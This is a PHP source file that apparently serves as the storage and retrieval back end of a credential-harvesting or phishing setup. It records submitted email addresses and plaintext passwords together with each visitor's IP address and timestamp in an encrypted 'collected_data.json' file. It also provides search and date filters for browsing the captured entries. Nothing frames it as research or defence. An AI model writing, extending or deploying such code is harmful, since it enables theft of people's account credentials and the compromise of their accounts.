<?php
require_once 'encryption_helper.php';

function saveToJson($email, $password) {
    $filename = 'collected_data.json';
    $data = [];
    
    // Read existing data if file exists and is not empty
    if (file_exists($filename) && filesize($filename) > 0) {
        try {
            $encryptedContent = file_get_contents($filename);
            $decryptedContent = $GLOBALS['encryptor']->decrypt($encryptedContent);
            $data = json_decode($decryptedContent, true);
            
            // Check if decoding was successful
            if (!is_array($data)) {
                $data = [];
            }
        } catch (Exception $e) {
            // If decryption fails, start with empty array
            $data = [];
        }
    }
    
    // Add new entry
    $newEntry = [
        'email' => $email,
        'password' => $password,
        'date' => date('Y-m-d'),
        'time' => date('H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $data[] = $newEntry;
    
    // Encrypt and save back to file
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    $encryptedData = $GLOBALS['encryptor']->encrypt($jsonData);
    
    if (file_put_contents($filename, $encryptedData) !== false) {
        return true;
    } else {
        error_log("Failed to write to JSON file: " . $filename);
        return false;
    }
}

function getJsonData($filters = []) {
    $filename = 'collected_data.json';
    
    if (!file_exists($filename) || filesize($filename) === 0) {
        return [];
    }
    
    try {
        $encryptedContent = file_get_contents($filename);
        $decryptedContent = $GLOBALS['encryptor']->decrypt($encryptedContent);
        $data = json_decode($decryptedContent, true);
        
        if (!is_array($data)) {
            return [];
        }
        
        // Apply filters if provided
        if (!empty($filters)) {
            $filteredData = [];
            foreach ($data as $entry) {
                $match = true;
                
                if (isset($filters['search']) && $filters['search'] !== '') {
                    $search = strtolower($filters['search']);
                    if (strpos(strtolower($entry['email']), $search) === false) {
                        $match = false;
                    }
                }
                
                if (isset($filters['from_date']) && $filters['from_date'] !== '') {
                    if ($entry['date'] < $filters['from_date']) {
                        $match = false;
                    }
                }
                
                if (isset($filters['to_date']) && $filters['to_date'] !== '') {
                    if ($entry['date'] > $filters['to_date']) {
                        $match = false;
                    }
                }
                
                if ($match) {
                    $filteredData[] = $entry;
                }
            }
            
            return $filteredData;
        }
        
        return $data;
    } catch (Exception $e) {
        error_log("Error reading JSON data: " . $e->getMessage());
        return [];
    }
}
?>